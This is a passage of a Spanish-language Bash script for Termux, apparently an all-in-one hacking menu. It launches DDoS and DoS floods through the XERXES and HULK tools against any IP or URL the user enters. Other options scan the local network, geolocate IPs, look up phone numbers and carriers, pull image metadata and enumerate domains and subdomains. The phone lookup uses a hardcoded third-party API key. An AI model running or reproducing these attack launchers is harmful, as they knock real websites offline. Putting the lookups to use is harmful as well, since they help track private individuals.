 chmod +x $PREFIX/bin/XERXES 
 chmod +x ~/trackerssl/.modules/xerxes 
 fi 
 echo -e "                ${GR}[${R}-${GR}] ${W}ATAQUE DDOS ${GR}[${R}-${GR}]" 
 echo 
 echo -e "  ${R}[${G}*${R}]${W} Ingresa la ${GR}IP ${W}del sitio web" 
 echo -ne "${R}      ╰────➤ " 
 read vic 
 sleep 1 
 if [ -z "${vic}" ]; then 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R}${R} ERROR: ${W}Debes ingresar un dato" 
 echo 
 exit 
 fi 
 banner 
 echo -e "                       ${GR}[${R}-${GR}] ${W}ATAQUE DDOS ${GR}[${R}-${GR}]" 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R}${R} Iniciando ataque...${W}" 
 echo 
 sleep 2 
 XERXES ${vic} 80 
 elif [[ "${sw}" == "02" || "${sw}" == "2" ]]; then 
 banner 
 if [ ! -x $PREFIX/bin/HULK ]; then 
 echo ''' #!/bin/bash 
 HULK="/data/data/com.termux/files/home/trackerssl/.modules/hulk" 
 cd ${HULK} 
 exec python2 "${HULK}/hulk.py" "$@" 
 ''' > $PREFIX/bin/HULK 
 chmod +x $PREFIX/bin/HULK 
 chmod +x ~/trackerssl/.modules/hulk/hulk.py 
 chmod +x ~/trackerssl/.modules/hulk/hulk.go 
 chmod +x ~/trackerssl/.modules/hulk/go.mod 
 chmod +x ~/trackerssl/.modules/hulk/docker 
 chmod +x ~/trackerssl/.modules/hulk/docker/Dockerfile 
 fi 
 echo -e "               ${GR}[${R}-${GR}] ${W}ATAQUE DOS ${GR}[${R}-${GR}]" 
 echo 
 echo -e "  ${R}[${G}*${R}]${W} Ingresa el sitio web ${GR}https:// ${W}-${GR} http://" 
 echo -ne "${R}      ╰────➤ " 
 read vic2 
 if [ -z "${vic2}" ]; then 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R}${R} ERROR: ${W}Debes ingresar un dato" 
 echo 
 exit 
 fi 
 banner 
 echo -e "               ${GR}[${R}-${GR}] ${W}ATAQUE DOS ${GR}[${R}-${GR}]" 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R}${R} Iniciando ataque...${W}" 
 echo 
 sleep 2 
 HULK ${vic2} 
 else 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} ERROR:${W} La opción ${GR}${sw} ${W}no existe" 
 echo 
 sleep 1 
 exit 
 fi 
 elif [[ "${opt}" == "5" || "${opt}" == "05" ]]; then 
 if [ ! -x /data/data/com.termux/files/usr/bin/exiftool ]; then 
 banner 
 sleep 0.5 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R}${R} ERROR: ${W}Exiftool no está instalado" 
 echo 
 sleep 1 
 banner 
 echo -e "            ${W}[${R}=${W}]${GR} INSTALANDO EXIFTOOL ${W}[${R}=${W}]${W}" 
 echo 
 sleep 2 
 yes|pkg install exiftool 
 fi 
 banner 
 echo -e "           ${G}::::${W}[${W}EXTRAER METADATOS${W}]${G}::::${W}" 
 echo 
 echo -e "  ${R}[${G}*${R}]${W} Ingresa la ruta completa de la imagen:" 
 echo 
 echo -ne "  ${R}[${G}>>${R}]${W} " 
 read ex 
 if [ -z "${ex}" ]; then 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} ${R}ERROR:${W} Debes ingresar la ruta" 
 echo 
 exit 
 fi 
 if [[ -f ${ex} ]];then 
 banner 
 echo -e "          ${G}::::${W}[${W}EXTRAER METADATOS${W}]${G}::::${W}" 
 echo 
 bs=$(basename ${ex}) 
 echo -e "${G}[${R}*${G}] ${GR}Datos extraídos exitosamente de:${W} ${bs}" 
 echo 
         exiftool ${ex} 
 else 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} ${R}ERROR:${W} La imagen no existe" 
 echo 
 exit 
 fi 
 elif [[ "${opt}" == "6" || "${opt}" == "06" ]]; then 
 banner 
 echo -e "         ${G}:::${GR}[${W}VER MI IP PUBLICA/PRIVADA${GR}]${G}:::${W}" 
 echo 
 one=$(ifconfig 2>&1 | grep -i "inet 192.168" | cut -d " " -f 10) 
 echo -ne "  ${R}[${G}*${R}]${W} IP Privada:${R} ${one}" 
 if [ -z "${one}" ]; then 
 echo -e "No conectado a una red wifi${W}!" 
 fi 
 echo -ne "\n  ${R}[${G}*${R}]${W} IP Pública:${R} " 
 curl ipecho.net/plain 
 echo 
 echo 
 exit 
 elif [[ "${opt}" == "7" || "${opt}" == "07" ]]; then 
 banner 
 echo -e "          ${R}---{ ${GR}ESCANEO A MI RED WIFI${R} }---${W}" 
 echo 
 echo -e "  ${R}[${G}*${R}]${W} Cargando..." 
 echo -e "  ${R}[${G}*${R}]${W} Esto puede tomar un momento..." 
 echo 
 function scan() { 
 PrivateIP=$(ifconfig 2>&1 | grep -i "inet 192.168" | cut -d " " -f 10) 
 num=$(echo "${PrivateIP}" | cut -d "." -f 3) 
 gateway="192.168.${num}" 
 nmap -P 192.168.${num}.1-254 | grep -i "for" | cut -d " " -f 5 > ~/trackerssl/ip.tmp 
 } 
 scan > /dev/null 2>&1 
 if [ -z ${PrivateIP} ];then 
 banner 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} ${R}ERROR:${GR} No estás conectado a una red wifi${W}!" 
 echo 
 exit 
 fi 
 echo -e "   ${R}---{${W} DISPOSITIVOS${GR} CONECTADOS${W} EN MI RED${R} }---${W}" 
 echo 
 cat ~/trackerssl/ip.tmp 
 echo 
 rm ~/trackerssl/ip.tmp > /dev/null 2>&1 
 elif [[ "${opt}" == "8" || "${opt}" == "08" ]]; then 
 banner 
 ChCon 
 echo -e "       ${G}:::${GR}[${W} EXTRAER INFORMACIÓN DE UNA IP ${GR}]${G}:::${W}" 
 echo 
 echo -e "  ${R}[${G}01${R}]${W} Otra IP" 
 echo -e "  ${R}[${G}02${R}]${W} Mi IP" 
 echo 
 echo -ne "  ${R}Dtve_Web${W} >>${G} " 
 read ip 
 if [[ "${ip}" == "1" || "${ip}" == "01" ]]; then  
 banner 
 echo -ne "  ${R}[${G}*${R}]${W} Ingresa la IP ${R}>${W}> ${GR}" 
 read -r ip 
 if [ -z "${ip}" ]; then 
 echo 
 echo -e "${R}  ERROR:${W} Debes ingresar una IP" 
 echo 
 exit 
 fi 
 banner 
 echo -e "   ${R}[${G}••${R}]${W}${W} INFORMACIÓN OBTENIDA DE ${W}'${R}${wb}${W}' ${R}[${G}••${R}]${W}${W}" 
 echo 
 curl -s http://ip-api.com/${ip} 
 elif [[ "${ip}" == "2" || "${ip}" == "02" ]]; then 
 banner 
 echo -e "     ${R}[${G}••${R}]${W}${W} INFORMACIÓN DE MI IP OBTENIDA ${R}[${G}••${R}]${W}${W}" 
 echo 
 curl -s http://ip-api.com/ 
 echo 
 else 
 echo 
 echo -e "${R}  ERROR:${W} Opción incorrecta" 
 echo 
 exit 
 fi 
 elif [[ "${opt}" == "9" || "${opt}" == "09" ]]; then 
 banner 
 ChCon 
 echo -e "           ${G}▼ ${W}INFO DE NUMERO TELEFÓNICO ${G}▼${W}" 
 echo 
 echo -ne "  ${R}[${G}>${R}]${W} Número Completo: ${GR}" 
 read nu 
 if [ -z "${nu}" ]; then 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R}${R} ERROR:${W} Debes ingresar un número" 
 echo 
 exit 
 fi 
 api=c66a79fdb0c47e53109d077849cdcdd3 
 getphone=$(curl -s "apilayer.net/api/validate?access_key=$api&number='${nu}'&country_code=&format=1" -L > .phoneinfo.txt) >/dev/null 2>/dev/null 
  
 valid=$(grep -o 'valid\":true' .phoneinfo.txt ) 
 if [[ $valid == *'valid":true'* ]]; then 
 country=$(grep 'country_name\":\"' .phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"') 
 location=$(grep 'location\":\"' .phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"') 
 if [ -z "${location}" ]; then 
 location=$(echo -e "${R}No disponible!") 
 fi 
 carrier=$(grep 'carrier\":\"' .phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"') 
 line_type=$(grep 'line_type\":\"' .phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"') 
 valid=$(grep 'valid' .phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"') 
 FormInt=$(grep 'international_format\":\"' .phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"') 
 FormLoc=$(grep 'local_format\":\"' .phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"') 
 Code=$(grep 'country_prefix\":\"' .phoneinfo.txt | cut -d ":" -f2 | tr -d ',' | tr -d '\"') 
 IFS=$'\n' 
 if [ "${valid}" = "true" ]; then 
 si=$(echo -e "${GR}Si") 
 fi 
 banner 
 echo -e "    ${R}[${G}••${R}]${W}${W} INFORMACIÓN OBTENIDA EXITOSAMENTE ${R}[${G}••${R}]${W}${W}" 
 echo 
 printf "${R}[${G}√${R}]${W} Número investigado:${G} ${nu}\n${W}" 
 echo 
  
 printf "${R}[${G}•${R}]${W} ¿Número válido?:${GR} $si\n" 
 printf "${R}[${G}•${R}]${W} Pais:${GR} $country\n" 
 if [ -z "${valid}" ]; then 
 echo -e "${R}No disponible!" 
 fi 
 printf "${R}[${G}•${R}]${W} Formato internacional:${GR} $FormInt\n" 
 printf "${R}[${G}•${R}]${W} Formato local:${GR} $FormLoc\n" 
 printf "${R}[${G}•${R}]${W} Código/LADA:${GR} $Code\n" 
 printf "${R}[${G}•${R}]${W} Posible ubicacion:${GR} $location \n" 
 printf "${R}[${G}•${R}]${W} Operador:${GR} $carrier\n" 
 if [ -z "${carrier}" ]; then 
 echo -e "${R}No disponible!" 
 fi 
 printf "${R}[${G}•${R}]${W} Tipo de Línea:${GR} $line_type" 
 if [ -z "${line_type}" ]; then 
 echo -e "${R}No disponible!" 
 fi 
 printf "\n" 
 else 
 sleep 1 
 banner 
 echo -e "  ${GR}[${R}*${GR}] ${R}ERROR:${GR} APIs agotadas, espera a que sean actualizadas" 
 echo 
 exit 
 echo -e "             ${GR}╭──> Número érroneo" 
 echo -e "  ${GR}[${R}*${GR}] ${R}ERROR:${GR} │──> Número incompleto" 
 echo -e "             ${GR}╰──> Verifica buena conexión" 
 echo 
 fi 
 elif [[ "${opt}" == "10" ]]; then 
 banner 
 echo -e "                 ${R}(${W}-${R}) ${GR}ESCANEAR URL ${R}(${W}-${R})" 
 echo 
 echo -ne "  ${W}Ingresa la URL${R} >${GR}> ${R}" 
 read URLnmap 
 if [ -z "${URLnmap}" ]; then 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} ${R}ERROR:${W} Debes ingresar una URL" 
 echo 
 exit 
 fi 
 banner 
 echo -e "              ${R}(${W}-${R}) ${GR}ESCANEAR URL ${R}(${W}-${R})" 
 echo 
 echo -e "  ${R}[${G}*${R}]${W} URL: ${GR}${URLnmap}" 
 echo -e "  ${R}[${G}*${R}]${W} Escaneando... " 
 echo 
 sleep 2 
 nmap -p 80 --script=http-exif-spider -sV ${URLnmap} 
 exit 
 elif [[ "${opt}" == "11" ]]; then 
 banner 
 if [ ! -x $PREFIX/bin/Dom ]; then 
 echo ''' #!/bin/bash 
 Dom="/data/data/com.termux/files/home/trackerssl/.modules" 
 cd ${Dom} 
 exec python "${Dom}/Dom.py" "$@" 
 ''' > $PREFIX/bin/Dom 
 chmod +x $PREFIX/bin/Dom 
 fi 
 echo -e " ${R}-----{${W} RECOPILAR INFORMACIÓN DE UN DOMINIO${R} }----${W}" 
 echo 
 echo -e "  ${R}[${G}*${R}]${W} Ingresa el dominio a investigar:" 
 echo -e "      ${R}EJEMPLO:${GR} google.com${W}" 
 echo 
 echo -ne "  ${R}[${G}>>${R}]${W} " 
 read dominio 
 if [ -z "${dominio}" ]; then 
 sleep 0.6 
 echo 
 echo -e "  ${GR}[${R}*${GR}] ${R}ERROR:${W} Debes ingresar un dominio" 
 echo 
 exit 
 fi 
 echo 
 echo -e "${GR}  [${R}*${GR}]${W} Buscando... " 
 python3 -m pip install requests > /dev/null 
 sleep 2 
 banner 
 echo -e " ${R}-----{${W} RECOPILAR INFORMACIÓN DE UN DOMINIO${R} }----${W}" 
 echo 
 echo -e "    ${R}[${G}••${R}]${W}${G} INFORMACION OBTENIDA EXITOSAMENTE ${R}[${G}••${R}]${W}${W}" 
 echo 
 echo -e "  ${W}[${R}>${W}]${GR} DOMINIO:${R} ${dominio}${W}" 
 Dom -t ${dominio} 
 elif [[ "${opt}" == "12" ]]; then 
 banner 
 if [ ! -x $PREFIX/bin/CTFR ]; then 
 echo ''' #!/bin/bash 
 CTFR="/data/data/com.termux/files/home/trackerssl/.modules" 
 cd ${CTFR} 
 exec python "${CTFR}/ctfr.py" "$@" 
 ''' > $PREFIX/bin/CTFR 
 chmod +x $PREFIX/bin/CTFR 
 fi 
 echo -e "     ${G}::::${W}[${GR}OBTENER SUBDOMINIOS DE SITO WEB${W}]${G}::::${W}" 
 echo 
 echo -e "  ${R}[${G}*${R}]${W} Ingresa el sitio web" 
 echo -e "  ${GR}[${R}*${GR}]${R} EJEMPLO:${W} starbucks.com" 
 echo 
 echo -ne "  ${R}[${G}>>${R}]${W} " 
 read WebSite 
 if [ -z "${WebSite}" ]; then 
 sleep 0.6 
 echo 
 echo -e "  ${GR}[${R}*${GR}] ${R}ERROR:${W} Debes ingresar un dato" 
 echo 
 exit 
 fi 
 python3 -m pip install requests > /dev/null 
 banner 
 echo -e "     ${G}::::${W}[${GR}OBTENER SUBDOMINIOS DE SITO WEB${W}]${G}::::${W}" 
 echo 
 echo -e "   ${R}[${G}::${R}]${W}${G} SUBDOMINIOS OBTENIDOS EXITOSAMENTE ${R}[${G}::${R}]${W}${W}" 
 CTFR -d ${WebSite} 
 else 
 echo 
 echo -e "  ${GR}[${R}*${GR}]${R} ERROR:${W} La opción ${GR}${opt} ${W}no existe" 
 echo 
 sleep 1 
 banner 
 options 
 fi 
 } 
 # ============================================== 
 #              Declaring functions 
 # ============================================== 
 banner 
 options 
 # ============================================== 
 #                ATT @M7TEAMHK' 
 # ==============================================